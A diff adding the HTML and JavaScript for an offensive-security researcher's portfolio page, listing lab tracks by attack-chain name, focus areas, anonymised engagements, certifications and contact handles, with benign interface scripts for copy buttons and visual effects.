+        <div class="pillar"><div class="n">02 &middot; PHP &middot; &#9733;&#9733;&#9733;&#9734;&#9734;</div><h3>Estate Sale</h3><p>Object injection &rarr; POP gadget &rarr; webshell &rarr; RCE.</p></div>
+        <div class="pillar"><div class="n">03 &middot; Node &middot; &#9733;&#9733;&#9734;&#9734;&#9734;</div><h3>Render Farm</h3><p>Access-control bypass &rarr; EJS template injection &rarr; RCE.</p></div>
+        <div class="pillar"><div class="n">04 &middot; Flask &middot; &#9733;&#9733;&#9733;&#9733;&#9734;</div><h3>Ledger</h3><p>Blind SQL injection &rarr; secret exfil &rarr; pickle deserialization &rarr; RCE.</p></div>
+        <div class="pillar"><div class="n">05 &middot; Node &middot; &#9733;&#9733;&#9733;&#9733;&#9733;</div><h3>Polyfill</h3><p>Prototype pollution &rarr; command gadget &rarr; RCE (capstone).</p></div>
+        <div class="pillar" style="display:flex;flex-direction:column;justify-content:center"><div class="n">+ guide</div><h3>How I passed OSWE</h3><p>The prep guide and roadmap that ships with the track.</p></div>
+      </div>
+      <p class="note">Open-source &middot; MIT &middot; <a href="https://github.com/cyb3radull4m/cyb3radull4m-labs">github.com/cyb3radull4m/cyb3radull4m-labs</a></p>
+    </div>
+  </section>
+
+  <section id="focus" class="reveal">
+    <div class="wrap">
+      <p class="eyebrow"><span class="p">cyb3r@sec:~$</span> ./focus --list</p>
+      <h2>What I work on</h2>
+      <p class="lead">Six lanes I publish and operate in, from deep application logic up to full adversary emulation.</p>
+      <div class="pillars">
+        <div class="pillar"><div class="n">01</div><h3>Business logic &amp; financial flows</h3><p>Race conditions, state-machine abuse and value manipulation in transaction and payment systems.</p></div>
+        <div class="pillar"><div class="n">02</div><h3>Identity &amp; access</h3><p>Authentication, authorisation and KYC logic &mdash; the trust boundaries most tests skip.</p></div>
+        <div class="pillar"><div class="n">03</div><h3>Red team &amp; adversary emulation</h3><p>Covert initial access, C2 infrastructure and Active Directory attack chains at scale.</p></div>
+        <div class="pillar"><div class="n">04</div><h3>Malware dev &amp; EDR evasion</h3><p>Custom offensive tooling in C and C#, written with detection in mind.</p></div>
+        <div class="pillar"><div class="n">05</div><h3>Methodology</h3><p>How I recon, model a target's threat surface and chain low-signal findings into impact.</p></div>
+        <div class="pillar"><div class="n">06</div><h3>Security in Africa</h3><p>A senior offensive-security perspective on the region's financial and critical-infrastructure landscape.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="work" class="reveal">
+    <div class="wrap">
+      <p class="eyebrow"><span class="p">cyb3r@sec:~$</span> cat engagements.log</p>
+      <h2>Engagements</h2>
+      <p class="lead">Anonymised to respect every NDA. Sectors and outcomes only &mdash; never clients.</p>
+      <div class="work">
+        <div class="op"><div class="sector">Financial</div><div class="d"><h3>National interbank settlement system</h3><p>Full-scope red team against core payment rails; findings translated into a board-level risk roadmap.</p></div></div>
+        <div class="op"><div class="sector">Oil &amp; gas</div><div class="d"><h3>Upstream energy major</h3><p>Adversary emulation across network, Active Directory and cloud, replicating APT-grade tradecraft.</p></div></div>
+        <div class="op"><div class="sector">Government</div><div class="d"><h3>State government &amp; data-protection authority</h3><p>Offensive assessment of citizen-facing and internal infrastructure, with incident-response walkthroughs.</p></div></div>
+        <div class="op"><div class="sector">Healthcare</div><div class="d"><h3>Global healthcare leader &mdash; private bug bounty</h3><p>Ranked among the top 10 researchers worldwide on the program; deep business-logic findings on YesWeHack.</p></div></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="creds" class="reveal">
+    <div class="wrap">
+      <p class="eyebrow"><span class="p">cyb3r@sec:~$</span> sudo loadout --all</p>
+      <h2>Credentials</h2>
+      <p class="lead">Elite offensive certifications and nation-state-grade lab clears.</p>
+      <div class="credgrid">
+        <div>
+          <h3>Certifications</h3>
+          <ul class="taglist">
+            <li class="key">OSWE</li><li class="key">OSEP</li><li class="key">OSCP</li>
+            <li>Maldev Academy</li><li>LPT</li><li>CHFI</li><li>CEH</li>
+            <li>CAP</li><li>CNSP</li><li>QCS</li><li>CCNA</li><li>ISC2 CC</li><li>API Security Architect</li>
+          </ul>
+        </div>
+        <div>
+          <h3>HTB Pro Labs</h3>
+          <ul class="taglist">
+            <li class="key">APTLabs</li><li class="key">Cybernetics</li><li>Dante</li><li>Zephyr</li>
+            <li>Offshore</li><li>RastaLabs</li><li>Poo</li><li>Xen</li><li>Hades</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="contact" class="reveal">
+    <div class="wrap">
+      <p class="eyebrow"><span class="p">cyb3r@sec:~$</span> ./connect</p>
+      <h2>Get in touch</h2>
+      <p class="lead">Research collaboration, disclosure coordination, or a private program worth a look.</p>
+      <div class="contact-row">
+        <div class="cline"><span class="k">x</span><span class="v" id="c-x">@cyb3radull4m</span><button class="copy" data-copy="@cyb3radull4m" type="button">copy</button></div>
+        <div class="cline"><span class="k">github</span><span class="v" id="c-gh">cyb3radull4m</span><button class="copy" data-copy="github.com/cyb3radull4m" type="button">copy</button></div>
+        <div class="cline"><span class="k">mail</span><span class="v" id="c-mail">hey@cyb3radull4m.com</span><button class="copy" data-copy="hey@cyb3radull4m.com" type="button">copy</button></div>
+        <div class="cline"><span class="k">in</span><a class="v" href="https://www.linkedin.com/in/ewaoluwa-adeniji" target="_blank" rel="noopener">linkedin.com/in/ewaoluwa-adeniji</a></div>
+      </div>
+      <p class="note">PGP key published here once the domain is live &middot; handles shown are placeholders to confirm before launch.</p>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <span>cyb3radull4m &mdash; offensive security</span>
+    <span>built to be found</span>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var reduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+  var root=document.documentElement;
+  root.classList.add('has-js');
+
+  /* details polyfill for browsers without native support */
+  if(!('open' in document.createElement('details'))){
+    [].slice.call(document.querySelectorAll('details.post')).forEach(function(d){
+      var sum=d.querySelector('summary');
+      if(!sum) return;
+      var art=d.querySelector('.art');
+      if(art) art.style.display='none';
+      sum.addEventListener('click',function(e){
+        e.preventDefault();
+        if(d.hasAttribute('open')){
+          d.removeAttribute('open');
+          if(art) art.style.display='none';
+        } else {
+          d.setAttribute('open','');
+          if(art) art.style.display='block';
+        }
+      });
+    });
+  }
+
+  /* copy buttons */
+  document.querySelectorAll('.copy').forEach(function(b){
+    b.addEventListener('click',function(){
+      var t=b.getAttribute('data-copy');
+      function done(){ var o=b.textContent; b.textContent='ok'; b.classList.add('ok');
+        setTimeout(function(){ b.textContent=o; b.classList.remove('ok'); },1100); }
+      function sel(){ try{ var r=document.createRange(), el=b.previousElementSibling;
+        r.selectNodeContents(el); var s=window.getSelection(); s.removeAllRanges(); s.addRange(r); done(); }catch(e){} }
+      if(navigator.clipboard&&navigator.clipboard.writeText){ navigator.clipboard.writeText(t).then(done).catch(sel); } else { sel(); }
+    });
+  });
+
+  /* copy buttons on code blocks */
+  document.querySelectorAll('.art pre').forEach(function(pre){
+    var b=document.createElement('button'); b.className='cp'; b.type='button'; b.textContent='copy';
+    b.addEventListener('click',function(e){
+      e.preventDefault(); e.stopPropagation();
+      var code=pre.querySelector('code'); var t=code?code.innerText:pre.innerText;
+      function done(){ b.textContent='copied'; b.classList.add('ok');
+        setTimeout(function(){ b.textContent='copy'; b.classList.remove('ok'); },1100); }
+      if(navigator.clipboard&&navigator.clipboard.writeText){ navigator.clipboard.writeText(t).then(done).catch(function(){}); }
+    });
+    pre.appendChild(b);
+  });
+
+  /* matrix rain */
+  var cv=document.getElementById('matrix');
+  if(cv && cv.getContext){
+    var ctx=cv.getContext('2d'), fs=14, cols=0, drops=[],
+        chars="01<>/\\{}[]#$%&=+*ｱｶｷｹｺﾐﾇﾑﾎｻﾘﾂﾃﾅ0123456789ABCDEF".split("");
+    function mcol(){ return (getComputedStyle(root).getPropertyValue('--matrix')||'#2fd79a').trim(); }
+    function size(){ cv.width=cv.clientWidth; cv.height=cv.clientHeight;
+      cols=Math.ceil(cv.width/fs); drops=[]; for(var i=0;i<cols;i++) drops[i]=Math.random()*-30; }
+    function draw(){ ctx.fillStyle='rgba(10,12,17,0.085)'; ctx.fillRect(0,0,cv.width,cv.height);
+      ctx.fillStyle=mcol(); ctx.font=fs+'px monospace';
+      for(var i=0;i<cols;i++){ var t=chars[(Math.random()*chars.length)|0];
+        ctx.fillText(t,i*fs,drops[i]*fs);
+        if(drops[i]*fs>cv.height && Math.random()>0.975) drops[i]=0; drops[i]++; } }
+    size(); window.addEventListener('resize', size);
+    if(!reduce){ setInterval(draw, 55); } else { draw(); draw(); }
+  }
+
+  /* cursor glow */
+  var cg=document.getElementById('cursor-glow');
+  if(cg && !reduce && !('ontouchstart' in window)){
+    document.addEventListener('mousemove',function(e){
+      cg.style.left=e.clientX+'px';
+      cg.style.top=e.clientY+'px';
+    });
+  }
+
+  /* scroll-reveal sections */
+  var revs=[].slice.call(document.querySelectorAll('.reveal'));
+  if(reduce || !('IntersectionObserver' in window)){ revs.forEach(function(s){ s.classList.add('in'); }); }
+  else {
+    var io=new IntersectionObserver(function(es){ es.forEach(function(e){
+      if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target); } }); },
+      {rootMargin:'0px 0px -12% 0px',threshold:.08});
+    revs.forEach(function(s){ io.observe(s); });
+  }
+
+  /* active nav link via section in view */
+  var navlinks={}, sids=['writeups','labs','focus','work','creds','contact'];
+  document.querySelectorAll('.bar nav a').forEach(function(a){ navlinks[a.getAttribute('href').slice(1)]=a; });
+  if('IntersectionObserver' in window){
+    var cur=null;
+    var so=new IntersectionObserver(function(es){ es.forEach(function(e){
+      if(e.isIntersecting){ var id=e.target.id;
+        if(cur&&navlinks[cur]) navlinks[cur].classList.remove('active');
+        if(navlinks[id]){ navlinks[id].classList.add('active'); cur=id; } } }); },
+      {rootMargin:'-45% 0px -50% 0px',threshold:0});
+    sids.forEach(function(id){ var el=document.getElementById(id); if(el) so.observe(el); });
+  }
+
+  /* typed terminal boot */
+  var lines=[].slice.call(document.querySelectorAll('#term .tline'));
+  lines.forEach(function(l){ l.dataset.text=l.textContent; });
+  if(reduce){ return; }
+  lines.forEach(function(l){ l.textContent=''; });
+  var li=0;
+  (function typeLine(){
+    if(li>=lines.length){ return; }
+    var el=lines[li], txt=el.dataset.text, ci=0; el.classList.add('active');
+    (function ch(){
+      if(ci<=txt.length){ el.textContent=txt.slice(0,ci); ci++;
+        setTimeout(ch, el.classList.contains('cmd') ? (40+Math.random()*40) : (14+Math.random()*22)); }
+      else { el.classList.remove('active'); li++; setTimeout(typeLine, el.classList.contains('cmd')?220:120); }
+    })();
+  })();
+})();
+</script>
+</html>
